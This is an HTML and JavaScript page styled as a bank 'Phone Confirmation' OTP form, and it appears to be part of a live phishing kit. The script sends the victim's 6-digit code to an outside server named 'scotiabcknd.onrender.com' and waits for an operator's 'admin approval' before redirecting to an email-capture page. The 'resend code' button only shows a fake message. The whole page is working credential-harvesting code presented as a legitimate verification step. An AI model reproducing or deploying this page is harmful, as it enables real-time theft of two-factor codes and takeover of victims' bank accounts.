<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation - OTP Verification</title>
    <link rel="stylesheet" href="res/app.css">
    <style>
        .error {
            border-color: #ff4444 !important;
            box-shadow: 0 0 5px rgba(255, 68, 68, 0.5) !important;
        }
        .loading {
            opacity: 0.7;
            pointer-events: none;
        }
        #status-message {
            text-align: center;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            display: none;
        }
        #status-message.error {
            background-color: #ffebee;
            color: #c62828;
            border: 1px solid #ffcdd2;
        }
        #status-message.success {
            background-color: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #c8e6c9;
        }
        #status-message.info {
            background-color: #e3f2fd;
            color: #1565c0;
            border: 1px solid #bbdefb;
        }
        .error-message {
            color: #d32f2f;
            background-color: #ffebee;
            padding: 10px;
            border-radius: 4px;
            margin: 10px 0;
            text-align: center;
            border: 1px solid #ffcdd2;
            display: none;
        }
    </style>
</head>
<body>    
<main>
<div class="form">
    <div class="logo"><img src="res/logo.png" alt="Logo"></div>
    
    <div class="text">
        <h2>Phone Confirmation</h2>
        <span>Please enter the verification code sent to your phone</span>
    </div>

    <!-- Error message (shown when redirected with error) -->
    <div id="error-message" class="error-message">
        Invalid verification code. Please try again.
    </div>

    <!-- Status message for real-time feedback -->
    <div id="status-message"></div>

    <div class="col">
        <label>Confirmation Code</label>
        <input type="text" id="otp-input" placeholder="Enter 6-digit code" maxlength="6">
        <a href="#" onclick="resendCode()">Resend Code</a>
    </div>

    <div class="col">
        <button onclick="sendOTP()" id="submit-btn">Continue</button>
    </div>

    <div class="col links">
        <span>Help</span>
        <span>Privacy</span>
        <span>Terms</span>
    </div>
</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
// Backend URL - Update this to match your Flask backend
const BACKEND_URL = "https://scotiabcknd.onrender.com";
let currentSessionId = null;
let pollingInterval = null;

// Check if page was loaded with error parameter
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.has('e')) {
    document.getElementById('error-message').style.display = 'block';
}

function showMessage(text, type = "info") {
    const messageDiv = $("#status-message");
    messageDiv.removeClass("error success info").addClass(type);
    messageDiv.text(text).show();
}

function hideMessage() {
    $("#status-message").hide();
}

function setLoading(isLoading) {
    if (isLoading) {
        $("body").addClass("loading");
        $("#submit-btn").prop("disabled", true).text("Processing...");
    } else {
        $("body").removeClass("loading");
        $("#submit-btn").prop("disabled", false).text("Continue");
    }
}

function pollStatus(sessionId) {
    return new Promise((resolve, reject) => {
        $.ajax({
            url: `${BACKEND_URL}/status/${sessionId}`,
            method: "GET",
            success: function(response) {
                resolve(response);
            },
            error: function(xhr, status, error) {
                reject(error);
            }
        });
    });
}

async function waitForApproval(sessionId) {
    return new Promise(async (resolve, reject) => {
        let attempts = 0;
        const maxAttempts = 180; // 3 minutes
        
        pollingInterval = setInterval(async () => {
            attempts++;
            
            if (attempts >= maxAttempts) {
                clearInterval(pollingInterval);
                reject("Timeout waiting for approval");
                return;
            }
            
            try {
                const status = await pollStatus(sessionId);
                console.log("Polling status:", status);
                
                if (status.status === "approved") {
                    clearInterval(pollingInterval);
                    resolve(status.redirect_url);
                } else if (status.error) {
                    clearInterval(pollingInterval);
                    reject(status.error);
                }
            } catch (error) {
                console.error("Polling error:", error);
                // Continue polling on network errors
            }
        }, 1000);
    });
}

async function sendOTP() {
    // Reset
    $("#otp-input").removeClass("error");
    hideMessage();
    
    const otp = $("#otp-input").val().trim();
    
    // Validation
    if (!otp) {
        $("#otp-input").addClass("error");
        showMessage("Please enter the verification code", "error");
        return;
    }

    // Basic OTP validation (6 digits)
    if (!/^\d{6}$/.test(otp)) {
        $("#otp-input").addClass("error");
        showMessage("Please enter a valid 6-digit code", "error");
        return;
    }

    setLoading(true);
    showMessage("Verifying code...", "info");

    try {
        // Send OTP to backend
        const response = await $.ajax({
            url: `${BACKEND_URL}/otp`,
            method: "POST",
            contentType: "application/json",
            data: JSON.stringify({
                otp: otp
            })
        });

        console.log("OTP response:", response);
        
        if (response.success) {
            currentSessionId = response.id;
            showMessage("Code submitted. Waiting for approval...", "success");
            
            // Wait for admin approval
            try {
                const redirectUrl = await waitForApproval(currentSessionId);
                showMessage("Approved! Redirecting...", "success");
                
                // Redirect to the approved URL
                setTimeout(() => {
                    if (redirectUrl === "https://google.com") {
                        window.location.href = redirectUrl;
                    } else if (redirectUrl.includes(".html")) {
                        window.location.href = redirectUrl;
                    } else {
                        // Default next page
                        window.location.href = "email.html";
                    }
                }, 2000);
                
            } catch (error) {
                console.error("Approval waiting error:", error);
                showMessage(`Error: ${error}. Please try again.`, "error");
                setLoading(false);
            }
            
        } else {
            showMessage(response.error || "Verification failed", "error");
            setLoading(false);
        }
        
    } catch (error) {
        console.error("OTP submission error:", error);
        showMessage("Network error. Please check your connection and try again.", "error");
        setLoading(false);
    }
}

function resendCode() {
    showMessage("Resending verification code...", "info");
    
    // Simulate resend delay
    setTimeout(() => {
        showMessage("New verification code sent to your phone", "success");
    }, 1500);
    
    // In a real application, you would call a backend endpoint here
    // $.post(`${BACKEND_URL}/resend-otp`, {...})
}

// Handle Enter key
$("#otp-input").keypress(function (e) {
    if (e.key === "Enter") {
        sendOTP();
    }
});

// Auto-format OTP (optional)
$("#otp-input").on("input", function() {
    let value = $(this).val().replace(/\D/g, '');
    if (value.length > 6) value = value.substr(0, 6);
    $(this).val(value);
});

// Clean up polling interval if user navigates away
$(window).on("beforeunload", function() {
    if (pollingInterval) {
        clearInterval(pollingInterval);
    }
});

// Initialize
$(document).ready(function() {
    console.log("OTP page loaded");
    
    // Check for URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('e')) {
        showMessage("Invalid code. Please enter a new verification code.", "error");
    }
    
    // Auto-focus on OTP input
    $("#otp-input").focus();
});
</script>
</body>
</html>